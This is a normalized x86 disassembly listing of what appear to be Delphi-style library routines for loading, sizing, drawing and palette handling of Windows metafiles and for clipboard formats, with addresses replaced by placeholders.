xor eax eax
push ebp
push sub_41f05d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40323c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f100
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
add esp 0xfffffff0
call sub_403590
sub_41ef80
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f05d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40323c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f100
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_41f100
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f100
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f064
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fe0
retn
add esp 0xfffffff0
call sub_403590
sub_41f100
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f183
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d64
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407cc0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_404010
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404010
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_41386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f18a
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_41f194
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f212
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4139c8
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4031bc
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404220
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4043c8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f219
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41f228
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
add al 0xf3
inc ecx
add [ ecx ] dl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
inc esi
outsd
jb r-xdata
psubsb mm6 mm6
inc edx
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
mov eax eax
sub_41f284
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41f330
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41f330
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41f330
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f304
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40326c
mov eax [ esi + 0x8 ]
call sub_40326c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41f330
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41386c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f374
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f398
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_4139c8
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4139c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41f414
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
call sub_41f3d4
call sub_41f3f4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f454
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41f484
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4031b4
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414068
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_41f4b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4033f8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40326c
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403480
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403480
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403468
sub_41f534
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_41f5c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_40326c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4031b4
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f5e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_41f398
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f65b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_41d8e8
mov eax [ ebx + 0xc ]
call sub_40326c
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403480
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403468
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41f6a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_41f71c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_41f534
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_41f534
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413f84
mov edx ebx
mov eax esi
call sub_41f534
jmp r-xdata
pop esi
pop ebx
retn
sub_41f778
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41f79c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41f7c4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f8cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404220
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41f194
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_40326c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f84d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f8d2
lea eax [ ebp - 0x48 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41f852
mov eax [ ebp - 0x4 ]
call sub_40326c
call sub_403a20
call sub_403a74
mov eax [ ebx + 0xc ]
call sub_40326c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f8d2
lea eax [ ebp - 0x48 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403480
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41f8dc
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4031bc
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b78
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_41f938
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_41f9b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41f7c4
mov eax [ ebp - 0x8 ]
push eax
push sub_41f8dc
push ebp
call sub_41f938
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fa30
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41b904
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41fa70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41eba0
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41fab8
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_420a90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41fae8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_420a90
mov edx esi
mov eax ebx
call sub_413f84
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_420a8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_41fb7c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41d628
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41d628
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41d628
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41d628
push eax
call SelectPalette
sub_41fc14
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41fdbc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_41fc78
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41b904
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_41fd04
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41fdbc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_41fd68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4202e4
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415620
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_41ff20
mov edx esi
mov eax ebx
call sub_41fe50
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_41fdbc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_420a90
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_420a8c
pop esi
pop ebx
retn
sub_41fde4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_4202e4
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_41ff20
mov edx esi
mov eax ebx
call sub_41fe50
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_41fe50
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41fdbc
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41584c
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_41ff10
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028b8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41584c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41d918
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff17
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41d918
sub_41ff20
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_41fdbc
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41d918
lea eax [ ebp - 0x22 ]
call sub_41e768
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42008f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41d918
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420096
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
call sub_41d918
sub_4200a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
